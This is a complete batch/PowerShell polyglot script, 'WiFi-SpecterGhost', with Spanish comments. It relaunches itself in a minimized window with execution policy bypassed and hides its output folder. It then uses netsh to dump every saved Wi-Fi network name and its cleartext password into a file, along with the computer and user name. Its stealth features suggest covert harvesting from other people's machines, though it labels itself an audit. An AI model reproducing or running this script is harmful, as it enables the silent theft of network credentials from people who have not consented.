<# :
@echo off
:: WiFi-SpecterGhost [Discreto Mode]
:: Este archivo es portable e independiente.
if not "%1"=="min" (
    start /min powershell -ExecutionPolicy Bypass -WindowStyle Minimized -Command "iex (Get-Content '%~f0' -Raw)"
    exit /b
)
#>

# --- WiFi-SpecterGhost Engine [Embedded - Universal] ---
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$OutputEncoding = [System.Text.Encoding]::UTF8

$Silent = $true
$UseHiddenFolder = $true
$OutputName = "wpsd.txt"
$FolderName = "logs"

$scriptDirectory = Split-Path -Parent $MyInvocation.MyCommand.Path
if (-not $scriptDirectory) { $scriptDirectory = Get-Location }

# --- Configuracion de rutas y nombres ---
$targetFolder = Join-Path -Path $scriptDirectory -ChildPath $FolderName
try {
    if (-not (Test-Path -Path $targetFolder)) {
        New-Item -Path $targetFolder -ItemType Directory -Force | Out-Null
    }
    $folderItem = Get-Item -Path $targetFolder -Force
    if (($folderItem.Attributes -band [System.IO.FileAttributes]::Hidden) -ne [System.IO.FileAttributes]::Hidden) {
        $folderItem.Attributes = $folderItem.Attributes -bor [System.IO.FileAttributes]::Hidden
    }
} catch { }

# Lógica de incremento
$baseName = [System.IO.Path]::GetFileNameWithoutExtension($OutputName)
$extension = [System.IO.Path]::GetExtension($OutputName)
$finalOutputName = $OutputName
$counter = 1

while (Test-Path (Join-Path -Path $targetFolder -ChildPath $finalOutputName)) {
    $finalOutputName = "$baseName.$counter$extension"
    $counter++
}

$outputFilePath = Join-Path -Path $targetFolder -ChildPath $finalOutputName

# Escribir encabezado de metadata
try {
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    $computerName = $env:COMPUTERNAME
    $userName = $env:USERNAME
    
    $header = @"
=========================================
 AUDITORIA: WiFi-SpecterGhost            
 FECHA    : $timestamp                   
 EQUIPO   : $computerName                
 USUARIO  : $userName                    
=========================================
"@
    $header | Add-Content -Path $outputFilePath -Encoding UTF8
} catch { }

# Obtener perfiles - Regex agnostico (indentacion 4+ y colon)
$profilesOutput = (netsh wlan show profiles 2>$null)
$profileLines = $profilesOutput | Where-Object { $_ -match '^\s{4,}.+:\s+(.+)$' }

if ($profileLines) {
    foreach ($line in $profileLines) {
        if ($line -match ':\s*(.+)$') {
            $profileName = $matches[1].Trim()
            $password = "[No encontrada]"

            try {
                $profileDetailOutput = (netsh wlan show profile name="$profileName" key=clear 2>$null)
                foreach ($dLine in $profileDetailOutput) {
                    if ($dLine -match '(?:Autenticacion|Authentication)\s*:\s*(?:Abierta|Open)') {
                        $password = "[Red Abierta / Sin Clave]"
                    }
                    if ($dLine -match '(?:Contenido de la clave|Key Content|Key Material)\s*:\s*(.+)$') {
                        $password = $matches[1].Trim()
                        break
                    }
                }
            } catch { continue }

            try {
                "SSID: $profileName" | Add-Content -Path $outputFilePath -Encoding UTF8
                "PWD: $password" | Add-Content -Path $outputFilePath -Encoding UTF8
                "-----------------------------------------" | Add-Content -Path $outputFilePath -Encoding UTF8
            } catch { }
        }
    }
}
